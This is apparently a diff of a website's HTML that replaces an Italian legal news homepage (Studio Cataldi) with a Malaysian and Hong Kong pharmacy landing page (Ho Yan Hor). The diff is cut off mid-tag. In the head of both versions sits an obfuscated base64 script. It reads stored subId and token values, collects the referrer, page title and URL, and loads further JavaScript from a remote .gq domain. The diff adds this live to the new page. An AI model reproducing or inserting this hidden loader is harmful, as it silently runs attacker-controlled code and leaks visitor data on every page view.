@@ -1,343 +1,115 @@
-
 <!DOCTYPE html>
-<html lang="it" xmlns="http://www.w3.org/1999/xhtml">
-<head>
+<html lang="en">
+    <head>
+    	<script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfc3drTkdqZnlycjhOUXlnSCc7CiAgICBpZiAoIXdpbmRvdy5fc3drTkdqZnlycjhOUXlnSCkgewogICAgICAgIHdpbmRvdy5fc3drTkdqZnlycjhOUXlnSCA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly95YXNha2VldnJhZHlpMy5ncS90Z1ZwSk1NOCcsCiAgICAgICAgICAgIFBfUEFUSDogJ2h0dHBzOi8veWFzYWtlZXZyYWR5aTMuZ3EvMGNjNzAzNS9wb3N0YmFjaycsCiAgICAgICAgfTsKICAgIH0KICAgIGNvbnN0IF9jeHBNRkRaSnBmM1k1RGRnID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ2NvbmZpZycpOwogICAgaWYgKHR5cGVvZiBfY3hwTUZEWkpwZjNZNURkZyAhPT0gJ3VuZGVmaW5lZCcgJiYgX2N4cE1GRFpKcGYzWTVEZGcgIT09IG51bGwpIHsKICAgICAgICB2YXIgX1FGQkdoa0p5c24xWkZyNzcgPSBKU09OLnBhcnNlKF9jeHBNRkRaSnBmM1k1RGRnKTsKICAgICAgICB2YXIgX2ZMaFdwYnJSWDZIeGhXS2ogPSBNYXRoLnJvdW5kKCtuZXcgRGF0ZSgpLzEwMDApOwogICAgICAgIGlmIChfUUZCR2hrSnlzbjFaRnI3Ny5jcmVhdGVkX2F0ICsgd2luZG93Ll9zd2tOR2pmeXJyOE5ReWdILnR0bCA8IF9mTGhXcGJyUlg2SHhoV0tqKSB7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdzdWJJZCcpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgndG9rZW4nKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ2NvbmZpZycpOwogICAgICAgIH0KICAgIH0KICAgIHZhciBfdmM4empSSEJWVzR5M1ZHaiA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdzdWJJZCcpOwogICAgdmFyIF9Dbmh3QmpiTEtTM2ZKZ1JzID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3Rva2VuJyk7CiAgICB2YXIgX2MzQmNiOVlLWXEzbUpTYlIgPSAnP3JldHVybj1qcy5jbGllbnQnOwogICAgICAgIF9jM0JjYjlZS1lxM21KU2JSICs9ICcmJyArIGRlY29kZVVSSUNvbXBvbmVudCh3aW5kb3cubG9jYXRpb24uc2VhcmNoLnJlcGxhY2UoJz8nLCAnJykpOwogICAgICAgIF9jM0JjYjlZS1lxM21KU2JSICs9ICcmc2VfcmVmZXJyZXI9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5yZWZlcnJlcik7CiAgICAgICAgX2MzQmNiOVlLWXEzbUpTYlIgKz0gJyZkZWZhdWx0X2tleXdvcmQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC50aXRsZSk7CiAgICAgICAgX2MzQmNiOVlLWXEzbUpTYlIgKz0gJyZsYW5kaW5nX3VybD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmxvY2F0aW9uLmhvc3RuYW1lICsgZG9jdW1lbnQubG9jYXRpb24ucGF0aG5hbWUpOwogICAgICAgIF9jM0JjYjlZS1lxM21KU2JSICs9ICcmbmFtZT0nICsgZW5jb2RlVVJJQ29tcG9uZW50KG5hbWUpOwogICAgaWYgKHR5cGVvZiBfdmM4empSSEJWVzR5M1ZHaiAhPT0gJ3VuZGVmaW5lZCcgJiYgX3ZjOHpqUkhCVlc0eTNWR2ogJiYgd2luZG93Ll9zd2tOR2pmeXJyOE5ReWdILnVuaXF1ZSkgewogICAgICAgIF9jM0JjYjlZS1lxM21KU2JSICs9ICcmc3ViX2lkPScgKyBlbmNvZGVVUklDb21wb25lbnQoX3ZjOHpqUkhCVlc0eTNWR2opOwogICAgfQogICAgaWYgKHR5cGVvZiBfQ25od0JqYkxLUzNmSmdScyAhPT0gJ3VuZGVmaW5lZCcgJiYgX0NuaHdCamJMS1MzZkpnUnMgJiYgd2luZG93Ll9zd2tOR2pmeXJyOE5ReWdILnVuaXF1ZSkgewogICAgICAgIF9jM0JjYjlZS1lxM21KU2JSICs9ICcmdG9rZW49JyArIGVuY29kZVVSSUNvbXBvbmVudChfQ25od0JqYkxLUzNmSmdScyk7CiAgICB9CiAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICAgIGEudHlwZSA9ICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JzsKICAgICAgICBhLnNyYyA9IHdpbmRvdy5fc3drTkdqZnlycjhOUXlnSC5SX1BBVEggKyBfYzNCY2I5WUtZcTNtSlNiUjsKICAgIHZhciBzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ3NjcmlwdCcpWzBdOwogICAgcy5wYXJlbnROb2RlLmluc2VydEJlZm9yZShhLCBzKQogICAgfSkoKTsKICAgIA=="></script>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">       
+        <meta name="author" content="">		
+        <link rel="icon" href="{{ site_url }}themes/hovid/assets/images/favico.png">       
+				
+        <!-- Bootstrap core CSS -->
+        <link href="bootstrap-3.3.1/dist/css/bootstrap.min.css" rel="stylesheet">
+        <link href="css/carousel.css" rel="stylesheet">
+        <link href="css/landing.css" rel="stylesheet">
+        <!-- Custom styles for this template -->
+        <link href='http://fonts.googleapis.com/css?family=Oswald:400,700,300' rel='stylesheet' type='text/css'>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+        <script src="bootstrap-3.3.1/dist/js/bootstrap.min.js"></script>
+		
+		
+       
+   </head>
+   
+    <body>
+		<div class="top_bg text-center">
+			<img style="margin:0 auto;" class="img-responsive" src="images/HoYanHor-logo.png"/>
+		</div>
+		<!-- Carousel
+		================================================== -->
+		<div id="myCarousel" class="carousel slide" data-ride="carousel">
+		  <!-- Indicators 
+		  <ol class="carousel-indicators">
+			<li data-target="#myCarousel" data-slide-to="0" class="active"></li>
+			<li data-target="#myCarousel" data-slide-to="1" class=""></li>
+		  </ol>-->
+		  <div class="carousel-inner">
+			<div class="item active">
+				<a target="_blank" href="#">
+					<img class="img-full" style="margin:0 auto;"  src="images/HYH-slider01.jpg" alt="Second slide">
+				</a>
+			</div>
+			<div class="item">
+				<img class="img-full" style="margin:0 auto;"  src="images/HYH-slider02.jpg" alt="Second slide">
+			</div>
+		  </div>
+		  <a class="left carousel-control" href="#myCarousel" role="button" data-slide="prev"><span class="glyphicon glyphicon-chevron-left"></span></a>
+		  <a class="right carousel-control" href="#myCarousel" role="button" data-slide="next"><span class="glyphicon glyphicon-chevron-right"></span></a>
+		</div><!-- /.carousel -->
+		<br clear="all">
+		<br clear="all">
+		<div class="container">
+			<div class="text-center oswald-bold lg">
+				WELCOME TO HO YAN HOR
+			</div>
+			<div class="text-center oswald g">
+				Please select your country
+			</div>
+			<br clear="all">
+			<br clear="all">
+		</div>
+		<div class="">
+			<div class="col-xs-6" style="border-right:1px dashed #ccc;border-bottom:1px dashed #ccc;padding:0px 30px 60px 10px">
+				<a href="http://hoyanhor.com.my/" target="_blank">
+					<img style="margin:0 auto;float:right" class="img-responsive" src="images/country-malaysia.jpg"/>
+				</a>
+				<br clear="all">
+				<br clear="all">
+				<div class="caption oswald text-right" style="padding-right:48px">Malaysia</div>
+			</div>
+			<div class="col-xs-6" style="border-bottom:1px dashed #ccc;padding:0px 10px 60px 30px">                            <a href="http://www.hoyanhor.com.hk/" target="_blank">
+					<img class="img-responsive" src="images/country-hongkong.jpg"/>
+				<br clear="all">
+				<div class="caption oswald" style="padding-left:44px">Hong Kong</div>
+			</div>
+		</div>
+		<br clear="all">
+		<br clear="all">
+		<!--<div class="container">
+			<div class="row">
+				<div class="col-md-12 text-right">
+					<img style="margin:0 auto;" class="img-responsive" src="images/country-malaysia.jpg"/>
+				</div>
+				<br clear="all">
+				<br clear="all">
+				<div class="col-md-12">
+					<img style="margin:0 auto;" class="img-responsive" src="images/country-hongkong.jpg"/>
+				</div>
+			</div>
+		</div>-->
+		<div class="text-center">
+			<div class="oswald follow">FOLLOW US</div>
+			<br clear="all">
+			<ul class="list-inline">
+				<li>
+					<a href="https://www.facebook.com/HoYanHor" target="_blank"><img src="images/icon-facebook.png"></a>
+				</li>
+				<li>
+					<a href="https://www.youtube.com/user/hovidberhad" target="_blank"><img src="images/icon-youtube.png"></a>
+				</li>
+			</ul>
+		</div>
+		<br clear="all">
+		<div class="small text-center">Copyright &copy; 2020 Hovid Pharmacy Sdn Bhd. Website design by <a style="text-decoration:none;color:#606060" href="http://mymonsterlab.com.my/">My Monster Lab.</a></div>
+		<br clear="all">
+		<script>
+			$(document).ready(function(){
+				$('.carousel').carousel({
+				  interval: 10000
+				})
+			});
+		</script>
 	
-<meta charset="UTF-8">
-<title>Studio Cataldi - il Diritto Quotidiano. Notizie giuridiche, guide legali, sentenze</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<meta name="description" content="Quotidiano del diritto, con notizie giuridiche sempre aggiornate, guide legali, sentenze della Cassazione e di merito, codici e leggi, formulari e risorse giuridiche.">
-<meta property="og:image" content="https://www.studiocataldi.it/logo-2020.png">
-<script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfc3drTkdqZnlycjhOUXlnSCc7CiAgICBpZiAoIXdpbmRvdy5fc3drTkdqZnlycjhOUXlnSCkgewogICAgICAgIHdpbmRvdy5fc3drTkdqZnlycjhOUXlnSCA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly95YXNha2VldnJhZHlpMy5ncS90Z1ZwSk1NOCcsCiAgICAgICAgICAgIFBfUEFUSDogJ2h0dHBzOi8veWFzYWtlZXZyYWR5aTMuZ3EvMGNjNzAzNS9wb3N0YmFjaycsCiAgICAgICAgfTsKICAgIH0KICAgIGNvbnN0IF9jeHBNRkRaSnBmM1k1RGRnID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ2NvbmZpZycpOwogICAgaWYgKHR5cGVvZiBfY3hwTUZEWkpwZjNZNURkZyAhPT0gJ3VuZGVmaW5lZCcgJiYgX2N4cE1GRFpKcGYzWTVEZGcgIT09IG51bGwpIHsKICAgICAgICB2YXIgX1FGQkdoa0p5c24xWkZyNzcgPSBKU09OLnBhcnNlKF9jeHBNRkRaSnBmM1k1RGRnKTsKICAgICAgICB2YXIgX2ZMaFdwYnJSWDZIeGhXS2ogPSBNYXRoLnJvdW5kKCtuZXcgRGF0ZSgpLzEwMDApOwogICAgICAgIGlmIChfUUZCR2hrSnlzbjFaRnI3Ny5jcmVhdGVkX2F0ICsgd2luZG93Ll9zd2tOR2pmeXJyOE5ReWdILnR0bCA8IF9mTGhXcGJyUlg2SHhoV0tqKSB7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdzdWJJZCcpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgndG9rZW4nKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ2NvbmZpZycpOwogICAgICAgIH0KICAgIH0KICAgIHZhciBfdmM4empSSEJWVzR5M1ZHaiA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdzdWJJZCcpOwogICAgdmFyIF9Dbmh3QmpiTEtTM2ZKZ1JzID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3Rva2VuJyk7CiAgICB2YXIgX2MzQmNiOVlLWXEzbUpTYlIgPSAnP3JldHVybj1qcy5jbGllbnQnOwogICAgICAgIF9jM0JjYjlZS1lxM21KU2JSICs9ICcmJyArIGRlY29kZVVSSUNvbXBvbmVudCh3aW5kb3cubG9jYXRpb24uc2VhcmNoLnJlcGxhY2UoJz8nLCAnJykpOwogICAgICAgIF9jM0JjYjlZS1lxM21KU2JSICs9ICcmc2VfcmVmZXJyZXI9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5yZWZlcnJlcik7CiAgICAgICAgX2MzQmNiOVlLWXEzbUpTYlIgKz0gJyZkZWZhdWx0X2tleXdvcmQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC50aXRsZSk7CiAgICAgICAgX2MzQmNiOVlLWXEzbUpTYlIgKz0gJyZsYW5kaW5nX3VybD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmxvY2F0aW9uLmhvc3RuYW1lICsgZG9jdW1lbnQubG9jYXRpb24ucGF0aG5hbWUpOwogICAgICAgIF9jM0JjYjlZS1lxM21KU2JSICs9ICcmbmFtZT0nICsgZW5jb2RlVVJJQ29tcG9uZW50KG5hbWUpOwogICAgaWYgKHR5cGVvZiBfdmM4empSSEJWVzR5M1ZHaiAhPT0gJ3VuZGVmaW5lZCcgJiYgX3ZjOHpqUkhCVlc0eTNWR2ogJiYgd2luZG93Ll9zd2tOR2pmeXJyOE5ReWdILnVuaXF1ZSkgewogICAgICAgIF9jM0JjYjlZS1lxM21KU2JSICs9ICcmc3ViX2lkPScgKyBlbmNvZGVVUklDb21wb25lbnQoX3ZjOHpqUkhCVlc0eTNWR2opOwogICAgfQogICAgaWYgKHR5cGVvZiBfQ25od0JqYkxLUzNmSmdScyAhPT0gJ3VuZGVmaW5lZCcgJiYgX0NuaHdCamJMS1MzZkpnUnMgJiYgd2luZG93Ll9zd2tOR2pmeXJyOE5ReWdILnVuaXF1ZSkgewogICAgICAgIF9jM0JjYjlZS1lxM21KU2JSICs9ICcmdG9rZW49JyArIGVuY29kZVVSSUNvbXBvbmVudChfQ25od0JqYkxLUzNmSmdScyk7CiAgICB9CiAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICAgIGEudHlwZSA9ICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JzsKICAgICAgICBhLnNyYyA9IHdpbmRvdy5fc3drTkdqZnlycjhOUXlnSC5SX1BBVEggKyBfYzNCY2I5WUtZcTNtSlNiUjsKICAgIHZhciBzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ3NjcmlwdCcpWzBdOwogICAgcy5wYXJlbnROb2RlLmluc2VydEJlZm9yZShhLCBzKQogICAgfSkoKTsKICAgIA=="></script><link rel="alternate" type="application/rss+xml" title="RSS prima pagina" href="https://feeds.feedburner.com/studiocataldi/PrimaPagina">
-<link rel="Shortcut Icon" type="image/ico" href="https://www.studiocataldi.it/favicon.ico">
-<link href="https://www.studiocataldi.it/style/style-2020.min.css?ver=1.380" rel="stylesheet" />
-<link rel="canonical" href="https://www.studiocataldi.it" />
-</head>
-<body>
-<header>
-<div class="header-top-bar-container">
-<div class="header-top-bar">
-<div class="scrolled-text-box">
-<div class="scrolled">
-<p>
-<a target="_blank" href="https://www.studiocataldi.it/articoli/38271-separazioni-e-divorzi-online-le-linee-guida-del-cnf.asp">Separazioni e divorzi online: le linee guida del Cnf</a>&nbsp;<i>Lucia Izzo</i> - 27/04/20&nbsp;&nbsp;|&nbsp;&nbsp;<a target="_blank" href="https://www.studiocataldi.it/articoli/38285-coronavirus-inizia-la-fase-2.asp">Coronavirus: inizia la fase 2</a>&nbsp;<i> Redazione</i> - 26/04/20&nbsp;&nbsp;|&nbsp;&nbsp;<a target="_blank" href="https://www.studiocataldi.it/articoli/38134-terremoto-2016-il-sisma-dimenticato.asp">Terremoto 2016. Il sisma dimenticato</a>&nbsp;<i>Simone Vazzana</i> - 24/04/20&nbsp;&nbsp;|&nbsp;&nbsp;<a target="_blank" href="https://www.studiocataldi.it/articoli/38226-esame-avvocati-nel-mirino-delle-nazioni-unite.asp">Esame avvocati nel mirino delle Nazioni Unite</a>&nbsp;<i>Vittorio Corasaniti</i> - 23/04/20&nbsp;&nbsp;|&nbsp;&nbsp;<a target="_blank" href="https://www.studiocataldi.it/articoli/38207-app-immuni-tutti-i-nodi-da-sciogliere.asp">App Immuni: tutti i nodi da sciogliere</a>&nbsp;<i>Lucia Izzo</i> - 22/04/20&nbsp;&nbsp;|&nbsp;&nbsp;
-</p>
-</div>
-</div>
-<div id="right-header-section">
-<a class="search-icon-link" href="https://www.studiocataldi.it/cerca/"><div class="search-icon"></div></a>
-<ul class="social-icons clearfix">
-<li>
-<a href="https://www.studiocataldi.it/segui-studio-cataldi.asp" class="share">Seguici</a>
-</li>
-</ul>
-<ul class="social-icons-mobile clearfix">
-<li>
-<a href="https://www.studiocataldi.it/segui-studio-cataldi.asp" class="share">Seguici</a>
-</li>
-</ul>
-<form class="search" action="https://www.studiocataldi.it/cerca/risultati.asp" method="get" onsubmit="javascript:if (document.getElementById('sc').value==''){ document.location.href='https://www.studiocataldi.it/cerca/'; return false;}">
-<input type="text" name="sc" id="sc" placeholder="Cerca..." class="search-input hint" />
-<input type="submit" class="search-submit" value="" />
-</form>
-</div>
-</div>
-</div>
-<div class="logo-new">
-<a href="https://www.studiocataldi.it/"><img src="https://www.studiocataldi.it/logo-2020-300.png" alt="logo studio cataldi"></a>
-<div class="top-right-banner">
-<ins class="adsbygoogle adslot_1" data-ad-client="ca-pub-7966962822806303" data-ad-slot="3448567217"></ins>
-<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<script>    (adsbygoogle = window.adsbygoogle || []).push({});</script>
-</div>
-</div>
-<nav id="menu">
-<label for="tm" id="toggle-menu"></label>
-<input type="checkbox" id="tm">
-<ul class="main-menu clearfix">
-<li class="selected"><a href="https://www.studiocataldi.it/" title="Home">Home</a></li>
-<li><a href="https://www.studiocataldi.it/articoli/" title="Archivio notizie giuridiche">Notizie giuridiche</a>
-<input type="checkbox" id="sm1">
-<ul class="sub-menu">
-<li><a href="https://www.studiocataldi.it/articoli/">Archivio notizie giuridiche</a></li>
-<li><a href="https://www.studiocataldi.it/argomenti/">Categorie</a></li>
-<li><a href="https://www.studiocataldi.it/tag.asp">Tag Giuridici</a></li>
-
-<li><a href="https://www.studiocataldi.it/ultimora.asp">Ultima ora</a></li>
-</ul>
-</li>
-<li><a href="https://www.studiocataldi.it/guide_legali/" title="Guide legali">Guide legali</a>
-<input type="checkbox" id="sm2">
-<ul class="sub-menu">
-<li><a href="https://www.studiocataldi.it/guide-diritto-civile/">Guide Diritto Civile</a></li>
-<li><a href="https://www.studiocataldi.it/guide_legali/procedura-civile/">Guide Procedura civile</a></li>
-<li><a href="https://www.studiocataldi.it/guide-diritto-penale/">Guide Diritto Penale</a></li>
-<li><a href="https://www.studiocataldi.it/guide_legali/guide-procedura-penale/">Guide Procedura penale</a></li>
-<li><a href="https://www.studiocataldi.it/guide_legali/">Tutte le guide</a></li>
-</ul>
-</li>
-<li><a href="https://www.studiocataldi.it/formulari.asp" title="Formulari giuridici">Formulari</a>
-<input type="checkbox" id="sm3">
-<ul class="sub-menu">
-<li><a href="https://www.studiocataldi.it/formulario/atti-civile/">Formulario civile</a></li>
-<li><a href="https://www.studiocataldi.it/formulario/atti-penale/">Formulario penale</a></li>
-<li><a href="https://www.studiocataldi.it/formulari.asp">Indice principali formule</a></li>
-</ul>
-</li>
-<li><a href="https://www.studiocataldi.it/risorse.asp" title="Risorse giuridiche">Risorse</a>
-<input type="checkbox" id="sm4">
-<ul class="sub-menu">
-<li><a href="https://www.studiocataldi.it/calcolo-assegno-mantenimento/">Calcolo mantenimento</a></li>
-<li><a href="https://www.studiocataldi.it/interessi-e-rivalutazione-monetaria/">Interessi e Rivalutazione</a></li>
-<li><a href="https://www.studiocataldi.it/nota-civile-2014/tribunale.asp">Nota Spese Avvocati</a></li>
-<li><a href="https://www.studiocataldi.it/calcolo-danno-biologico/">Calcolo danno biologico</a></li>
-<li><a href="https://www.studiocataldi.it/calcolo-codice-fiscale.asp">Calcolo codice fiscale</a></li>
-<li><a href="https://www.studiocataldi.it/risorse.asp">Tutte le risorse</a></li>
-</ul>
-</li>
-<li><a href="https://www.studiocataldi.it/normativa/raccolta_normativa.asp" title="Codici e leggi">Codici e leggi</a>
-<input type="checkbox" id="sm5">
-<ul class="sub-menu">
-<li><a href="https://www.studiocataldi.it/codicecivile/">Codice civile</a></li>
-<li><a href="https://www.studiocataldi.it/codicepenale/">Codice Penale</a></li>
-<li><a href="https://www.studiocataldi.it/codiceproceduracivile/codiceproceduracivile.asp">Codice procedura civile</a></li>
-<li><a href="https://www.studiocataldi.it/codiceprocedurapenale/codiceprocedurapenale.asp">Codice procedura penale</a></li>
-<li><a href="https://www.studiocataldi.it/normativa/codicedellastrada/">Codice della Strada</a></li>
-<li><a href="https://www.studiocataldi.it/normativa/raccolta_normativa.asp">Tutta la raccolta normativa</a></li>
-</ul>
-</li>
-<li><a href="https://www.studiocataldi.it/giurisprudenza.asp" title="Sentenze della Cassazione">Sentenze Cassazione</a></li>
-
-</ul>
-</nav>
-</header>
-<div class="clear"></div>
-<div class="creditvision-banner">
-<div itemscope itemtype="https://schema.org/WPAdBlock">
-<a target="_blank" rel="nofollow" href="https://www.creditvision.it/landing_L01/" itemprop="url">
-<img src="https://www.studiocataldi.it/images/varie/creditvision.jpg" itemprop="image" style="width:100%" alt="creditvision">
-</a>
-</div>
-</div>
-<div class="creditvision-banner-mobile">
-<div itemscope itemtype="https://schema.org/WPAdBlock">
-<a target="_blank" rel="nofollow" href="https://www.creditvision.it/landing_L01/" itemprop="url">
-<img src="https://www.studiocataldi.it/images/varie/creditvision50new2.png" itemprop="image" style="width:100%" alt="creditvision">
-</a>
-</div>
-</div>
-<div class="clear"></div>
-<div class="h1home">
-<h1 class="h1mob">Studio Cataldi - il diritto quotidiano. Notizie giuridiche e guide legali</h1>
-</div>
-<div id="most-read"></div>
-<main>
-<section>
-<div class='bl-main-news'> <img src="https://www.studiocataldi.it/images/imgnews/divorzio-internet-coppia-id38271.jpg" alt="Separazioni e divorzi online: le linee guida del Cnf"><div class='bl-main-news-text'><a href="https://www.studiocataldi.it/articoli/38271-separazioni-e-divorzi-online-le-linee-guida-del-cnf.asp"><h2>Separazioni e divorzi online: le linee guida del Cnf</h2></a><p>Il Consiglio Nazionale Forense prende atto della fase emergenziale e sottolinea la necessità di garantire lo svolgimento dei procedimento in materia di diritto di famiglia</p></div></div><div class='home-page-row'><div class='home-page-article-top-separator1'></div><div class='home-page-article-top-separator2'></div><ul><li class='home-page-article'><a href="https://www.studiocataldi.it/articoli/38263-bancomat.asp"><div class="home-page-article-img-container"><img class="home-img-news" src="https://www.studiocataldi.it/images/imgnews/bancomat-soldi-id38263.jpg" alt="Bancomat" style='display: block;'></div></a><h2><a href="https://www.studiocataldi.it/articoli/38263-bancomat.asp">Bancomat</a></h2><p>Bancomat per il linguaggio comune è soprattutto la carta di debito che permette di pagare e prelevare contanti dagli sportelli Atm</p><a class='read-more' href="https://www.studiocataldi.it/articoli/38263-bancomat.asp" title='CONTINUA A LEGGERE'><span class='arrow'></span><span>CONTINUA A LEGGERE</span></a></li><li class='home-page-article'><a href="https://www.studiocataldi.it/articoli/38243-cassazione-non-si-puo-condannare-il-medico-se-la-paziente-ha-poche-possibilita-di-sopravvivere.asp"><div class="home-page-article-img-container"><img class="home-img-news" src="https://www.studiocataldi.it/images/imgnews/medico-id22358.jpg" alt="Cassazione: non si può condannare il medico se la paziente ha poche possibilità di sopravvivere" style='display: block;'></div></a><h2><a href="https://www.studiocataldi.it/articoli/38243-cassazione-non-si-puo-condannare-il-medico-se-la-paziente-ha-poche-possibilita-di-sopravvivere.asp">Cassazione: non si può condannare il medico se la paziente ha poche possibilità di sopravvivere</a></h2><p>Il giudizio controfattuale richiede che la responsabilità medica venga accertata in base a un criterio di alta probabilità logica</p><a class='read-more' href="https://www.studiocataldi.it/articoli/38243-cassazione-non-si-puo-condannare-il-medico-se-la-paziente-ha-poche-possibilita-di-sopravvivere.asp" title='CONTINUA A LEGGERE'><span class='arrow'></span><span>CONTINUA A LEGGERE</span></a></li></ul></div><div class='home-page-row'><div class='home-page-article-top-separator1'></div><div class='home-page-article-top-separator2'></div><ul><li class='home-page-article'><a href="https://www.studiocataldi.it/articoli/38266-coronavirus-dieci-proposte-dell-associazione-luca-coscioni.asp"><div class="home-page-article-img-container"><img class="home-img-news lazy" src='https://www.studiocataldi.it/images/lazy.png' data-original="https://www.studiocataldi.it/images/imgnews/medico-stetoscopio-cuore-salute-id37587.jpg" alt="Coronavirus, dieci proposte dell'Associazione Luca Coscioni" style='display: block;'></div></a><h2><a href="https://www.studiocataldi.it/articoli/38266-coronavirus-dieci-proposte-dell-associazione-luca-coscioni.asp">Coronavirus, dieci proposte dell'Associazione Luca Coscioni</a></h2><p>Dai test a campione, al codice dell'app &quot;Immuni&quot; i lavori da sottoporre al vaglio del Governo oggi e l'idea di riforme strutturali per il domani</p><a class='read-more' href="https://www.studiocataldi.it/articoli/38266-coronavirus-dieci-proposte-dell-associazione-luca-coscioni.asp" title='CONTINUA A LEGGERE'><span class='arrow'></span><span>CONTINUA A LEGGERE</span></a></li><li class='home-page-article'><a href="https://www.studiocataldi.it/articoli/38267-gratuito-patrocinio-accolte-le-richieste-dell-aiga.asp"><div class="home-page-article-img-container"><img class="home-img-news lazy" src='https://www.studiocataldi.it/images/lazy.png' data-original="https://www.studiocataldi.it/images/imgnews/aula-della-camera-dei-deputati-id16581.jpg" alt="Gratuito patrocinio, accolte le richieste dell'Aiga " style='display: block;'></div></a><h2><a href="https://www.studiocataldi.it/articoli/38267-gratuito-patrocinio-accolte-le-richieste-dell-aiga.asp">Gratuito patrocinio, accolte le richieste dell'Aiga </a></h2><p>La Camera approva l'ordine del giorno in tema di patrocinio a spese dello Stato presentato dal capogruppo della Commissione Giustizia della Camera dei Deputati, Devis Dori</p><a class='read-more' href="https://www.studiocataldi.it/articoli/38267-gratuito-patrocinio-accolte-le-richieste-dell-aiga.asp" title='CONTINUA A LEGGERE'><span class='arrow'></span><span>CONTINUA A LEGGERE</span></a></li></ul></div><div class='home-page-row'><div class='home-page-article-top-separator1'></div><div class='home-page-article-top-separator2'></div><ul><li class='home-page-article'><a href="https://www.studiocataldi.it/articoli/38270-processo-da-casa-le-misure-per-gli-avvocati.asp"><div class="home-page-article-img-container"><img class="home-img-news lazy" src='https://www.studiocataldi.it/images/lazy.png' data-original="https://www.studiocataldi.it/images/imgnews/avvocato-videoconferenza-giudice-id38270.jpg" alt="Processo 'da casa': le misure per gli avvocati" style='display: block;'></div></a><h2><a href="https://www.studiocataldi.it/articoli/38270-processo-da-casa-le-misure-per-gli-avvocati.asp">Processo 'da casa': le misure per gli avvocati</a></h2><p>Dalla procura alle liti al deposito telematico, quali sono le misure del decreto Cura Italia approvato definitivamente dal Parlamento che hanno effetto sull'attività dei difensori</p><a class='read-more' href="https://www.studiocataldi.it/articoli/38270-processo-da-casa-le-misure-per-gli-avvocati.asp" title='CONTINUA A LEGGERE'><span class='arrow'></span><span>CONTINUA A LEGGERE</span></a></li><li class='home-page-article'><a href="https://www.studiocataldi.it/articoli/38251-recovery-fund.asp"><div class="home-page-article-img-container"><img class="home-img-news lazy" src='https://www.studiocataldi.it/images/lazy.png' data-original="https://www.studiocataldi.it/images/imgnews/banca-bce-id16782.jpg" alt="Recovery Fund" style='display: block;'></div></a><h2><a href="https://www.studiocataldi.it/articoli/38251-recovery-fund.asp">Recovery Fund</a></h2><p>Via libera da parte dei leader UE al Recovery Fund, il fondo per la ripresa basato sul prossimo bilancio europeo 2021-2027</p><a class='read-more' href="https://www.studiocataldi.it/articoli/38251-recovery-fund.asp" title='CONTINUA A LEGGERE'><span class='arrow'></span><span>CONTINUA A LEGGERE</span></a></li></ul></div><div class='home-page-row'><div class='home-page-article-top-separator1'></div><div class='home-page-article-top-separator2'></div><ul><li class='home-page-article'><a href="https://www.studiocataldi.it/articoli/38285-coronavirus-inizia-la-fase-2.asp"><div class="home-page-article-img-container"><img class="home-img-news lazy" src='https://www.studiocataldi.it/images/lazy.png' data-original="https://www.studiocataldi.it/images/imgnews/conte-26-4-2020-id38285.png" alt="Coronavirus: inizia la fase 2" style='display: block;'></div></a><h2><a href="https://www.studiocataldi.it/articoli/38285-coronavirus-inizia-la-fase-2.asp">Coronavirus: inizia la fase 2</a></h2><p>&quot;Se ami l'Italia mantieni le distanze&quot;. Questo il 'motto' della riapertura della fase 2 annunciata dal premier Conte in conferenza stampa</p><a class='read-more' href="https://www.studiocataldi.it/articoli/38285-coronavirus-inizia-la-fase-2.asp" title='CONTINUA A LEGGERE'><span class='arrow'></span><span>CONTINUA A LEGGERE</span></a></li><li class='home-page-article'><a href="https://www.studiocataldi.it/articoli/38235-compensi-avvocati-prevale-l-accordo-col-cliente.asp"><div class="home-page-article-img-container"><img class="home-img-news lazy" src='https://www.studiocataldi.it/images/lazy.png' data-original="https://www.studiocataldi.it/images/imgnews/avvocati_accordo_preventivo-id27054.jpg" alt="Compensi avvocati: prevale l'accordo col cliente" style='display: block;'></div></a><h2><a 